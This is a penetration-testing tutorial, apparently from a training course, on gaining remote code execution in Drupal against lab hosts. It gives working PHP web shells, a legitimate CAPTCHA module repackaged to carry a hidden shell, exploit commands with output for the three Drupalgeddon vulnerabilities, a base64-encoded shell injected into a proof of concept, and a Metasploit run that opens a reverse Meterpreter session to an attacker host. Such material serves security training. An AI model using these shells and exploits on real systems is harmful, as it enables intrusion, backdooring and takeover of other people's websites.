# Attacking Drupal

Unlike WordPress or Joomla, gaining a shell through the Drupal admin panel is not as straightforward as editing a theme file directly. Drupal requires either enabling a specific module or uploading a backdoored module to achieve code execution. When admin access is not available, three major core vulnerabilities collectively known as Drupalgeddon provide alternative paths to RCE.

***

## Method 1: PHP Filter Module

### Drupal 7 (Module Enabled by Default)

In Drupal 7, the PHP Filter module ships enabled. Once logged in as admin:

1. Navigate to Modules at `/admin/modules` and confirm the PHP filter is enabled
2. Go to Content > Add content > Basic page
3. Add the following PHP snippet in the body field:

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

4. Set the Text format dropdown to PHP code
5. Click Save

The page will be created as a node, for example `/node/3`. Trigger it with cURL:

```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupal 8+ (Module Must Be Installed)

From Drupal 8 onwards, the PHP Filter module is not installed by default. You must download and install it manually. Check with your client before making this change to a production instance:

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Navigate to Administration > Reports > Available updates > Install new module, upload the archive, and install. Once installed, the same page creation steps from the Drupal 7 method apply.

After completing the assessment, disable or remove the PHP Filter module and delete any pages created during testing. Document all changes in the report appendix.

***

## Method 2: Backdoored Module Upload

This method works against any version of Drupal where you have admin access. Download a legitimate module to use as a carrier, embed a web shell inside it, and upload it as a new module.

1. Download and extract a legitimate module such as [CAPTCHA](https://www.drupal.org/project/captcha):

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

2. Create the PHP web shell file:

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

3. Create a `.htaccess` file to allow direct access to the module directory, since Drupal blocks it by default:

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

4. Move both files into the captcha directory and repackage it:

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

5. In the Drupal admin panel, navigate to Manage > Extend > Install new module, upload the modified archive, and click Install

6. Trigger the shell:

```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

## Method 3: Leveraging Drupalgeddon Vulnerabilities

Three critical Drupal core vulnerabilities are known collectively as Drupalgeddon:

| Name | CVE | Affected Versions | Type |
|---|---|---|---|
| Drupalgeddon | [CVE-2014-3704](https://nvd.nist.gov/vuln/detail/CVE-2014-3704) | 7.0 to 7.31 | Pre-auth SQL injection |
| Drupalgeddon2 | [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600) | Before 7.58 and 8.5.1 | Unauthenticated RCE |
| Drupalgeddon3 | [CVE-2018-7602](https://nvd.nist.gov/vuln/detail/CVE-2018-7602) | Drupal 7.x and 8.x | Authenticated RCE |

### Drupalgeddon (CVE-2014-3704)

This pre-authentication SQL injection allows creating a new admin user without credentials. Use the PoC from [Exploit-DB](https://www.exploit-db.com/exploits/34992) or the [Metasploit module](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/):

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

```
[!] VULNERABLE!
[!] Administrator user created!
[*] Login: hacker
[*] Pass: pwnd
```

Once you have admin access, use Method 1 or 2 above to gain code execution.

### Drupalgeddon2 (CVE-2018-7600)

Unauthenticated RCE caused by insufficient input sanitisation during user registration. The PoC is available at [github.com/a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600):

```bash
python3 drupalgeddon2.py
```

The default script uploads a test file to confirm exploitation. To get code execution, replace the echo command in the script with one that writes a malicious PHP file. First, base64-encode your web shell:

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

```
PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

Replace the echo command in the exploit script with:

```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

Run the modified script, then trigger the uploaded shell:

```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupalgeddon3 (CVE-2018-7602)

Authenticated RCE that exploits improper validation in the Form API. The attacker must have node delete permissions. Use [Metasploit's drupal_drupageddon3 module](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon3/) and supply a valid session cookie obtained after logging in:

```bash
msf6 > use exploit/multi/http/drupal_drupageddon3

msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > exploit
```

```
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612)

meterpreter > getuid
Server username: www-data (33)

meterpreter > sysinfo
Computer : app01
OS       : Linux app01 5.4.0-81-generic x86_64
```

Set `DRUPAL_NODE` to any existing node number that the authenticated user has permission to delete. The module extracts the form token from the delete confirmation page and uses it to inject the payload through the Form API.
